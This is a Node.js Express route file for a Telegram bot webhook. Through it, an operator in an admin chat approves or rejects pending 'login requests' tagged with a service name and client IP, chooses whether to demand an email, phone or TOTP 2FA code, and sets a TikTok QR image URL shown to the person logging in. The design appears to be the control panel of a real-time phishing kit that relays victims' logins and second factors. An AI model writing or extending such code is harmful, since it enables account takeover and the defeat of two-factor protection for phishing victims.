'use strict';

const { Router } = require('express');
const { TELEGRAM_WEBHOOK_SECRET, TELEGRAM_ADMIN_CHAT_ID } = require('../config');
const store = require('../lib/store');
const { tgApi, parseCallback } = require('../lib/telegram');

const router = Router();

const TWO_FA_TYPE_MAP = {
    '2fa_email': 'email',
    '2fa_phone': 'phone',
    '2fa_totp': 'totp'
};

function telegramUpdateKind(update) {
    if (!update || typeof update !== 'object') return 'empty';
    const skip = new Set(['update_id']);
    for (const k of Object.keys(update)) {
        if (skip.has(k)) continue;
        if (update[k] != null && typeof update[k] === 'object') return k;
    }
    return 'unknown';
}

/** Pull a URL from a Telegram text/caption (reply body). */
function parseTiktokImageUrlFromBody(raw) {
    if (!raw || typeof raw !== 'string') return null;
    const trimmed = raw.trim();
    if (!trimmed) return null;

    let m = trimmed.match(/^image_url:\s*(\S+)/i);
    if (m && m[1]) return m[1].trim();

    m = trimmed.match(/^image_url:\s*\n+\s*(https?:\/\/\S+)/im);
    if (m && m[1]) return m[1].trim();

    if (/^https?:\/\/\S+$/i.test(trimmed)) return trimmed;

    const lines = trimmed.split(/\r?\n/).map(l => l.trim()).filter(Boolean);
    for (const line of lines) {
        if (/^https?:\/\/\S+$/i.test(line)) return line;
    }

    m = trimmed.match(/(https?:\/\/[^\s<>"']+)/i);
    return m ? m[1].trim() : null;
}

/**
 * If this update is a reply that sets the TikTok QR image URL, handle it and end the response.
 * @returns {boolean} true if res was already sent (do not send again).
 */
function handleTiktokImageReply(update, res) {
    const replyMsg = update.message || update.edited_message;
    if (!replyMsg || !replyMsg.reply_to_message) return false;

    if (replyMsg.from && replyMsg.from.is_bot) return false;

    const bodyText = String(replyMsg.text || replyMsg.caption || '').trim();
    const imageUrl = parseTiktokImageUrlFromBody(bodyText);

    const looksLikeImageReply =
        Boolean(imageUrl) || /image_url/i.test(bodyText) || /https?:\/\//i.test(bodyText);
    if (looksLikeImageReply) {
        console.log(
            '[telegram] reply_to_message (TikTok image path)',
            JSON.stringify({
                update_id: update.update_id,
                chat_id: replyMsg.chat && replyMsg.chat.id,
                reply_to_message_id: replyMsg.reply_to_message.message_id,
                has_text: Boolean(replyMsg.text),
                has_caption: Boolean(replyMsg.caption),
                parsed_image_url: Boolean(imageUrl),
                body_preview: bodyText.slice(0, 120)
            })
        );
    }

    if (!imageUrl) return false;

    if (TELEGRAM_ADMIN_CHAT_ID && String(replyMsg.chat.id) !== String(TELEGRAM_ADMIN_CHAT_ID)) {
        console.warn(
            '[telegram] TikTok image reply ignored (chat_id does not match TELEGRAM_ADMIN_CHAT_ID)',
            JSON.stringify({ got: replyMsg.chat.id, expected: TELEGRAM_ADMIN_CHAT_ID })
        );
        res.sendStatus(200);
        return true;
    }

    const parent = replyMsg.reply_to_message;
    const repliedToMsgId = parent.message_id;
    const parentText = parent.text || parent.caption || '';

    let match = null;

    for (const [reqId, rec] of store.getAll().entries()) {
        if (rec.userId !== 'TikTok' || rec.status !== 'pending') continue;
        if (rec.telegramMessageId != null && rec.telegramMessageId === repliedToMsgId) {
            match = { rec, reqId };
            break;
        }
    }

    if (!match) {
        const idMatch = parentText.match(/Request ID:\s*([0-9a-f-]{36})/i);
        if (idMatch) {
            const reqId = idMatch[1];
            const rec = store.get(reqId);
            if (rec && rec.userId === 'TikTok' && rec.status === 'pending') {
                match = { rec, reqId };
            }
        }
    }

    if (match) {
        match.rec.status = 'show_image';
        match.rec.imageUrl = imageUrl;
        console.log('[tiktok] image URL set', JSON.stringify({ request_id: match.reqId, image_url: imageUrl }));
    } else {
        console.warn(
            '[telegram] TikTok image reply did not match any pending session',
            JSON.stringify({
                reply_to_message_id: repliedToMsgId,
                parent_preview: String(parentText).slice(0, 160),
                pending_tiktok_count: [...store.getAll().values()].filter(
                    r => r.userId === 'TikTok' && r.status === 'pending'
                ).length
            })
        );
    }

    res.sendStatus(200);
    return true;
}

router.post('/telegram/webhook', function (req, res) {
    const update = req.body || {};
    const kind = telegramUpdateKind(update);
    const updateId = update.update_id;
    console.log('[telegram] webhook received', JSON.stringify({ update_id: updateId, kind }));

    if (TELEGRAM_WEBHOOK_SECRET) {
        const token = req.get('X-Telegram-Bot-Api-Secret-Token');
        if (token !== TELEGRAM_WEBHOOK_SECRET) {
            console.warn(
                '[telegram] webhook 403: secret mismatch or missing',
                JSON.stringify({ update_id: updateId, kind, has_secret_header: Boolean(token) })
            );
            return res.status(403).send('Forbidden');
        }
    }
    const cq = update.callback_query;

    if (handleTiktokImageReply(update, res)) {
        return;
    }

    function respondOk() {
        return res.sendStatus(200);
    }

    function answer(text, showAlert) {
        if (!cq || !cq.id) return Promise.resolve();
        return tgApi('answerCallbackQuery', {
            callback_query_id: cq.id,
            text: text || '',
            show_alert: Boolean(showAlert)
        });
    }

    if (!cq) {
        return respondOk();
    }

    if (!cq.data) {
        answer('Empty action.', false).catch(() => {});
        return respondOk();
    }

    const parsed = parseCallback(cq.data);
    if (!parsed) {
        answer('Invalid button data.', true).catch(() => {});
        return respondOk();
    }

    const rec = store.get(parsed.requestId);
    const msg = cq.message;
    const chatId = msg && msg.chat && msg.chat.id;
    const messageId = msg && msg.message_id;
    const actor = cq.from && (cq.from.username ? '@' + cq.from.username : 'id:' + cq.from.id);

    function editMessage(label) {
        if (!chatId || !messageId || !rec) return;
        return tgApi('editMessageText', {
            chat_id: chatId,
            message_id: messageId,
            text: `${label}\n\n${rec.userId}\nIP: ${rec.clientIp}`,
            reply_markup: { inline_keyboard: [] }
        }).catch(e => console.error('editMessageText failed:', e));
    }

    if (!rec) {
        console.log('[telegram] callback ignored (unknown request)', JSON.stringify({ request_id: parsed.requestId, action: parsed.action, actor: actor || null }));
        answer('Request not found or expired.', true).catch(() => {});
        return respondOk();
    }

    if (store.now() > rec.expiresAt) {
        rec.status = 'rejected';
        console.log('[telegram] login rejected (expired)', JSON.stringify({ request_id: parsed.requestId, user: rec.userId, client_ip: rec.clientIp, actor: actor || null }));
        answer('Request expired.', true).catch(() => {});
        return respondOk();
    }

    if (rec.status === '2fa') {
        if (parsed.action === 'reject') {
            rec.status = 'rejected';
            console.log('[telegram] login rejected (during 2FA)', JSON.stringify({ request_id: parsed.requestId, user: rec.userId, actor: actor || null }));
            answer('Rejected.', false).catch(() => {});
            editMessage('❌ Rejected');
            return respondOk();
        }
        answer('Use the latest message — waiting for verification code.', true).catch(() => {});
        return respondOk();
    }

    if (rec.status !== 'pending') {
        console.log('[telegram] callback ignored (already ' + rec.status + ')', JSON.stringify({ request_id: parsed.requestId, user: rec.userId, actor: actor || null }));
        answer('Already handled.', false).catch(() => {});
        return respondOk();
    }

    if (parsed.action === 'approve') {
        rec.status = 'approved';
        console.log('[telegram] login approved', JSON.stringify({ request_id: parsed.requestId, user: rec.userId, client_ip: rec.clientIp, actor: actor || null }));
        answer('Approved.', false).catch(() => {});
        editMessage('✅ Approved');

    } else if (TWO_FA_TYPE_MAP[parsed.action]) {
        const twoFaType = TWO_FA_TYPE_MAP[parsed.action];
        rec.status = '2fa';
        rec.twoFactorType = twoFaType;
        console.log('[telegram] 2FA requested', JSON.stringify({ request_id: parsed.requestId, user: rec.userId, client_ip: rec.clientIp, type: twoFaType, actor: actor || null }));
        answer('2FA challenge sent.', false).catch(() => {});
        editMessage(`🔐 2FA (${twoFaType}) — awaiting code`);

    } else {
        rec.status = 'rejected';
        console.log('[telegram] login rejected', JSON.stringify({ request_id: parsed.requestId, user: rec.userId, client_ip: rec.clientIp, actor: actor || null }));
        answer('Rejected.', false).catch(() => {});
        editMessage('❌ Rejected');
    }

    return respondOk();
});

module.exports = router;
